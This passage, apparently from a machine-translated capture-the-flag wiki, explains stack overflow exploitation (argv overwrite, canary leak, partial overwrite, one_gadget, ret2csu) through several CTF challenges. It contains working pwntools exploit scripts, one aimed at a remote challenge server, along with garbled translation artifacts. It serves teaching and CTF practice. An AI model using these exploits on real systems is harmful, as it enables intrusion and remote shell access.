before calling `__IO_gets`, so we put the breakpoint at the call, as follows `` `asm gef\u27a4 b *0x000000000040080E Breakpoint 2 at 0x40080e gef\u27a4 c Continuing. Hello! What's your name? Breakpoint 2, 0x000000000040080e in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400804 xor eax, eax 0x400806 call 0x4006b0 <__printf_chk@plt> 0x40080b mov rdi, rsp \u2192 0x40080e call 0x4006c0 <_IO_gets@plt> \u21b3 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [rip+0x20062a] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 0x4006d0 sub rsp, 0x8 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffda40', 'l8'] 8 0x00007fffffffda40\u2502+0x00: 0x0000ff0000000000 \u2190 $rsp, $rdi 0x00007fffffffda48\u2502+0x08: 0x0000000000000000 0x00007fffffffda50\u2502+0x10: 0x0000000000000000 0x00007fffffffda58\u2502+0x18: 0x0000000000000000 0x00007fffffffda60\u2502+0x20: 0x0000000000000000 0x00007fffffffda68\u2502+0x28: 0x0000000000000000 0x00007fffffffda70\u2502+0x30: 0x0000000000000000 0x00007fffffffda78\u2502+0x38: 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x40080e \u2192 call 0x4006c0 <_IO_gets@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 print $rsp $1 = (void *) 0x7fffffffda40 It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is >>> 0x00007fffffffdc58 - 0x7fffffffda40 536 >>> hex ( 536 ) '0x218'","title":"Determine the flag address"},{"location":"pwn/linux/stackoverflow/fancy-rop/#using-the-program","text":"We construct the application as follows from pwn import * context . log_level = 'debug' smash = ELF ( './smashes' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.jarvisoj.com' , 9877 ) else : sh = process ( './smashes' ) argv_addr = 0x00007fffffffdc58 name_addr = 0x7fffffffda40 flag_addr = 0x600D20 another_flag_addr = 0x400d20 payload = 'a' * ( argv_addr - name_addr ) + p64 ( another_flag_addr ) sh . recvuntil ( 'name? ' ) sh . sendline ( payload ) sh . recvuntil ( 'flag: ' ) sh . sendline ( & #39;bb&#39;) data = sh . recv () sh . interactive () Here we get the flag directly, there is no online saying that the flag is not available.","title":"Using the program"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title_1","text":"2018 Net Ding Cup - guess","title":"Title"},{"location":"pwn/linux/stackoverflow/fancy-rop/#partial-overwrite-on-the-stack","text":"Partial overwrite This technique is applicable in many places. Here we use the partial overwrite on the stack as an example to introduce this idea. We know that after randomization (ASLR, PIE) is turned on, the lower 12-bit page offset is always fixed regardless of the high-order address, which means that if we can change the low-order offset, we can Control the execution flow of the program to some extent, bypassing PIE protection.","title":"partial overwrite on the stack"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-babypie","text":"Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/ Master/pwn/stackoverflow/partial_overwrite)","title":"2018-\u5b89\u6052\u676f-babypie"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection_1","text":"babypie: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped [ * ] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64-bit dynamically linked file with PIE protection and stack overflow protection enabled","title":"Determining protection"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_4","text":"Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc __int64 sub_960 () { char buf [ 40 ]; // [rsp+0h] [rbp-30h] unsigned __int64 v2 ; // [rsp+28h] [rbp-8h] v2 = __readfsqword ( 0x28u ); setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( _bss_start , 0L L , 2 , 0L L ); * ( _ OWORD * ) buf = 0uLL ; * ( _ OWORD * ) & amp ; buf [ 16 ] = 0uLL ; puts ( \"Input your Name:\" ); read ( 0 , buf , 0x30uLL ); // overflow printf ( \"Hello %s: \\n \" , buf , * ( _QWORD * ) buf , * ( _QWORD * ) & buf [ 8 ], * ( _QWORD * ) & buf [ 16 ], * ( _QWORD * ) & buf [ 24 ]); read ( 0 , buf , 0x60uLL ); // overflow return 0L L ; } Also found that the program gives a function that can directly get the shell ` asm .text:0000000000000A3E getshell proc near .text:0000000000000A3E ; __unwind { .text:0000000000000A3E push rbp .text:0000000000000A3F mov rbp, rsp .text:0000000000000A42 lea rdi, command ; \"/bin/sh\" .text:0000000000000A49 call _system .text:0000000000000A4E nop .text:0000000000000A4F pop rbp .text: 0000000000000A50 retn .text:0000000000000A50 ; } // starts at A3E .text:0000000000000A50 getshell endp So we just have to control rip to this function. #### leak canary There is an output immediately after the first read, and read does not add \\0 to the end of the input, which gives us the opportunity to leak the contents of the stack. In order to control the return address for the second overflow, we choose leak canary. It can be calculated that the length of the first read is 0x30 - 0x8 + 1 (+ 1 is to cover the value of the lowest bit of canary is non-zero, printf uses % s, when the end of \\0 is encountered, when the canary low is over non-zero, canary can be printed by printf) `` `asm Breakpoint 1, 0x0000557c8443aa08 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x7f1898a64690 (__read_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x30 RDI 0x557c8443ab15 \u25c2\u2014 insb byte ptr [rdi], dx /* 'Hello %s:\\n' */ RSI 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') R8 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R9 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R10 0x37b R11 0x246 R12 0x557c8443a830 \u25c2\u2014 xor ebp, ebp R13 0x7ffd97aa0540 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 RSP 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RIP 0x557c8443aa08 \u25c2\u2014 call 0x557c8443a7e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x557c8443aa08 call 0x557c8443a7e0 0x557c8443aa0d lea rax, [rbp - 0x30] 0x557c8443aa11 mov edx, 0x60 0x557c8443aa16 mov rsi, rax 0x557c8443aa19 mov edi, 0 0x557c8443aa1e call 0x557c8443a7f0 0x557c8443aa23 mov eax, 0 0x557c8443aa28 mov rcx, qword ptr [rbp - 8] 0x557c8443aa2c xor rcx, qword ptr fs:[0x28] 0x557c8443aa35 je 0x557c8443aa3c 0x557c8443aa37 call 0x557c8443a7c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rsi rsp 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') ... \u2193 05:0028\u2502 0x7ffd97aa0438 \u25c2\u2014 0xb3012605fc402a61 06:0030\u2502 rbp 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 07:0038\u2502 0x7ffd97aa0448 \u2014\u25b8 0x557c8443aa6a \u25c2\u2014 mov eax, 0 Breakpoint *(0x557c8443a000+0xA08) pwndbg> canary $1 = 0 canary : 0xb3012605fc402a00 pwndbg&gt; Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after 'a' * (0x30 - 0x8 + 1) are received, plus the lowest bit ' 0', we will recover the canary of the program.","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/stackoverflow/fancy-rop/#override-return-address","text":"With canary, you can overwrite the return address with the second stack overflow, and control the return address to the getshell function. Let's first look at the return address when there is no overflow. ` asm 0x000055dc43694a1e in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RBX 0x0 RCX 0x7f206c6696f0 (__write_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x60 RDI 0x0 RSI 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') R8 0x7f206cb22700 \u25c2\u2014 0x7f206cb22700 R9 0x3e R10 0x73 R11 0x246 R12 0x55dc43694830 \u25c2\u2014 xor ebp, ebp R13 0x7fff9aa3b050 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 RSP 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') RIP 0x55dc43694a1e \u25c2\u2014 call 0x55dc436947f0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500 [DISASM] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 0x55dc43694a08 call 0x55dc436947e0 0x55dc43694a0d lea rax, [rbp - 0x30] 0x55dc43694a11 mov edx, 0x60 0x55dc43694a16 mov rsi, rax 0x55dc43694a19 mov edi, 0 \u25ba 0x55dc43694a1e call 0x55dc436947f0 0x55dc43694a23 mov eax, 0 0x55dc43694a28 mov rcx, qword ptr [rbp - 8] 0x55dc43694a2c xor rcx, qword ptr fs:[0x28] 0x55dc43694a35 je 0x55dc43694a3c 0x55dc43694a37 call 0x55dc436947c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rax rsi rsp 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa') ... \u2193 05:0028\u2502 0x7fff9aa3af48 \u25c2\u2014 0xbfe0cfbabccd2861 06:0030\u2502 rbp 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 07:0038\u2502 0x7fff9aa3af58 \u2014\u25b8 0x55dc43694a6a \u25c2\u2014 mov eax, 0 pwndbg> x/10i (0x0A3E+0x55dc43694000) 0x55dc43694a3e: push rbp 0x55dc43694a3f: mov rbp,rsp 0x55dc43694a42: lea rdi,[rip+0xd7] # 0x55dc43694b20 0x55dc43694a49: call 0x55dc436947d0 0x55dc43694a4e: nop 0x55dc43694a4f: pop rbp 0x55dc43694a50: right 0x55dc43694a51: push rbp 0x55dc43694a52: mov rbp,rsp 0x55dc43694a55: sub rsp,0x10 It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell. The final script is as follows: ```python #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # context.log_level = \"debug\" context.terminal = [\"deepin-terminal\", \"-x\", \"sh\", \"-c\"] while True: try: io = process(\"./babypie\", timeout = 1) # gdb.attach (I) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8 + 1)) io.recvuntil (&#39;a&#39; * (0x30 - 0x8 + 1)) canary = &#39;0&#39; + io.recvn (7) success(canary.encode('hex')) # gdb.attach (I) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\\x3E\\x0A') io.interactive () except Exception as e: io.close () print e It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap.","title":"Override return address"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-xnuca-gets","text":"This topic is also very interesting, as follows __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { char * v4 ; // [rsp + 0h] [rbp-18h] gets (( char * ) & amp ; v4 ); return 0L L ; } The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. .","title":"2018-XNUCA-gets"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection_2","text":"First take a look at the protection of the program [ * ] ' / mnt / hgfs / CTF / 2018 / 1124 XNUCA / pwn / gets / gets ' Arch : amd64 -64 - little RELRO : Full RELRO Stack : No canary found NX : NX enabled PIE : No PIE ( 0x400000 ) It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where.","title":"Determining protection"},{"location":"pwn/linux/stackoverflow/fancy-rop/#analysis","text":"We know the basic execution flow of the program through the basic execution flow (executable part) of ELF. At the same time, we find that there are two function return addresses on the stack. ` asm pwndbg> stack 25 00:0000\u2502 rsp 0x7fffffffe398 \u2014\u25b8 0x7ffff7a2d830 (__libc_start_main+240) \u25c2\u2014 mov edi, eax 01:0008\u2502 0x7fffffffe3a0 \u25c2\u2014 0x1 02:0010\u2502 0x7fffffffe3a8 \u2014\u25b8 0x7fffffffe478 \u2014\u25b8 0x7fffffffe6d9 \u25c2\u2014 0x6667682f746e6d2f ('/mnt/hgf') 03:0018\u2502 0x7fffffffe3b0 \u25c2\u2014 0x1f7ffcca0 04:0020\u2502 0x7fffffffe3b8 \u2014\u25b8 0x400420 \u25c2\u2014 sub rsp, 0x18 05:0028\u2502 0x7fffffffe3c0 \u25c2\u2014 0x0 06:0030\u2502 0x7fffffffe3c8 \u25c2\u2014 0xf086047f3fb49558 07:0038\u2502 0x7fffffffe3d0 \u2014\u25b8 0x400440 \u25c2\u2014 xor ebp, ebp 08:0040\u2502 0x7fffffffe3d8 \u2014\u25b8 0x7fffffffe470 \u25c2\u2014 0x1 09:0048\u2502 0x7fffffffe3e0 \u25c2\u2014 0x0 ... \u2193 0b:0058\u2502 0x7fffffffe3f0 \u25c2\u2014 0xf79fb00f2749558 0c:0060\u2502 0x7fffffffe3f8 \u25c2\u2014 0xf79ebba9ae49558 0d:0068\u2502 0x7fffffffe400 \u25c2\u2014 0x0 ... \u2193 10: 0080\u2502 0x7fffffffe418 \u2014\u25b8 0x7fffffffe488 \u2014\u25b8 0x7fffffffe704 \u25c2\u2014 0x504d554a4f545541 ('AUTOMOTIVE') 11:0088\u2502 0x7fffffffe420 \u2014\u25b8 0x7ffff7ffe168 \u25c2\u2014 0x0 12:0090\u2502 0x7fffffffe428 \u2014\u25b8 0x7ffff7de77cb (_dl_init+139) \u25c2\u2014 jmp 0x7ffff7de77a0 Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7bcd000 0x7ffff7dcd000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dcd000 0x7ffff7dd1000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0 0x7ffff7dd7000 0x7ffff7dfd000 r-xp 26000 0 /lib/x86_64-linux-gnu/ld-2.23.so A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ? Let&#39;s first analyze the base address `0x7ffff7a0d000` of `libc`. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by `gets`, which means that `\\x00` will definitely exist at the end of the string. When we cover the bytes, we must cover the integer multiples, that is, we will cover at least 3 bytes, and let&#39;s take a look at the address `0x7ffff7a2d830` of `__libc_start_main+240`. If it covers 3 bytes, it is `0x7ffff700xxxx `, has been less than the base address of libc, there is no code position deliberately executed before. In general, the offset of libc_start_main in libc is not too bad, so obviously if we overwrite `__libc_start_main+240`, it is obviously impossible. And the base address of ld? If we overwrite `_dl_init+139` on the stack, it is `0x7ffff700xxxx`. Looking at the above memory layout, we can find that `libc` is in the low address direction of `ld`, so when randomizing, it is very likely that the third byte of libc is `\\x00`. For example, the current offset between the two is 0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000 Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`. Therefore, we have a good reason to choose to overwrite the `_dl_init+139` stored on the stack. So what is it covered? Still don&#39;t know. Because we don&#39;t know what the library version of libc is, We can cover the coverage first and see if the program will crash. After all, it is very likely that the code in the libc library will be executed. ```python from pwn import * context.terminal = ['tmux', 'split', '-h'] #context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] if args['DEBUG']: context.log_level = 'debug' elfpath = './gets' context.binary = elfpath elf = ELF (elf path) bits = elf.bits def exp(ip, port): for i in range(0x1000): if args['REMOTE']: p = remote(ip, port) else: p = process(elfpath, timeout=2) # gdb.attach(p) try: payload = 0x18 * 'a' + p64(0x40059B) for _ in range(2): payload += 'a' * 8 * 5 + p64(0x40059B) payload += 'a' * 8 * 5 + p16(i) p.sendline(payload) data = p.recv() print data p.interactive() p.close() except Exception: p.close() continue if __name__ == \"__main__\": exp('106.75.4.189', 35273) Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by (cfree+0x4c)[0x7f57b6f9253c] . ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c] /lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40] [0x7ffdec480f20] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00600000-00601000 r--p 00000000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00601000-00602000 rw-p 00001000 00:28 48745 /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets 00b21000-00b43000 rw-p 00000000 00:00 0 [heap] 7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0 7f57b0021000-7f57b4000000 ---p 00000000 00:00 0 7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so 7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0 7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0 7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0 7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397 /lib/x86_64-linux-gnu/ld-2.23.so 7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0 7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0 [stack] 7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0 [vvar] 7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address. \u279c gets one_gadget /lib/x86_64-linux-gnu/libc.so.6 0x45216 execve ( \"/bin/sh\" , rsp+0x30, environ ) constraints: rax == NULL 0x4526a execve ( \"/bin/sh\" , rsp+0x30, environ ) constraints: [ rsp+0x30 ] == NULL 0xf02a4 execve ( \"/bin/sh\" , rsp+0x50, environ ) constraints: [ rsp+0x50 ] == NULL 0xf1147 execve ( \"/bin/sh\" , rsp+0x70, environ ) constraints: [ rsp+0x70 ] == NULL Continue to blast with the following exp, from pwn import * context . terminal = [ 'tmux' , 'split' , '-h' ] #context.terminal = ['gnome-terminal', '-x', 'sh', '-c'] if args [ 'DEBUG' ]: context . log_level = 'debug' elfpath = './gets' context . binary = elfpath elf = ELF ( elf path ) bits = elf . bits def exp ( ip , port ): for i in range ( 0x1000 ): if args [ 'REMOTE' ]: p = remote ( ip , port ) else : p = process ( elfpath , timeout = 2 ) # gdb.attach(p) try : payload = 0x18 * 'a' + p64 ( 0x40059B ) for _ in range ( 2 ): payload += 'a' * 8 * 5 + p64 ( 0x40059B ) payload += 'a' * 8 * 5 + ' \\x16\\02 ' p . sendline ( payload ) p . sendline ( & #39;ls&#39;) data = p . recv () print data p . interactive () p . close () except Exception : p . close () continue if __name__ == \"__main__\" : exp ( '106.75.4.189' , 35273 ) Finally get the shell. $ ls exp . py gets","title":"Analysis"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title_2","text":"","title":"Title"},{"location":"pwn/linux/stackoverflow/medium-rop/","text":"\u4e2d\u7ea7ROP \u00b6 The intermediate ROP mainly uses some clever Gadgets. ret2csu \u00b6 Principle \u00b6 In 64-bit programs, the first six arguments to a function are passed through registers, but most of the time, it's hard to find the gadgets for each register. At this time, we can take advantage of the gadgets in __libc_csu_init under x64. This function is used to initialize libc, and the general program will call the libc function, so this function will exist. Let's take a look at this function first (of course, there are some differences between different versions of this function) ` asm .text:00000000004005C0 ; void _libc_csu_init(void) .text:00000000004005C0 public __libc_csu_init .text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o .text:00000000004005C0 push r15 .text:00000000004005C2 push r14 .text: 00000000004005C4 mov r15d, edi .text:00000000004005C7 push r13 .text:00000000004005C9 push r12 .text:00000000004005CB lea r12, __frame_dummy_init_array_entry .text:00000000004005D2 push rbp .text: 00000000004005D3 lea rbp, __do_global_dtors_to_final_array_entry .text:00000000004005DA push rbx .text:00000000004005DB mov r14, rsi .text:00000000004005DE mov r13, rdx .text:00000000004005E1 sub rbp, r12 .text:00000000004005E4 sub rsp, 8 .text: 00000000004005E8 sar rbp, 3 .text:00000000004005EC call _init_proc .text:00000000004005F1 test rbp, rbp .text:00000000004005F4 jz short loc_400616 .text:00000000004005F6 xor ebx, ebx .text:00000000004005F8 nop dword ptr [rax+rax+00000000h] .text:0000000000400600 .text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text:0000000000400600 mov rdx, r13 .text:0000000000400603 mov rsi, r14 .text: 0000000000400606 mov, r15d .text:0000000000400609 call qword ptr [r12+rbx*8] .text:000000000040060D add rbx, 1 .text:0000000000400611 cmp rbx, rbp .text:0000000000400614 jnz short loc_400600 .text:0000000000400616 .text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text:0000000000400616 add rsp, 8 .text:000000000040061A pop rbx .text:000000000040061B pop rbp .text:000000000040061C pop r12 .text:000000000040061E pop r13 .text:0000000000400620 pop r14 .text:0000000000400622 pop r15 .text: 0000000000400624 retn .text:0000000000400624 __libc_csu_init endp Here we can use the following points - From 0x000000000040061A to the end, we can use the stack overflow to construct data on the stack to control the data in the rbx, rbp, r12, r13, r14, r15 registers. - From 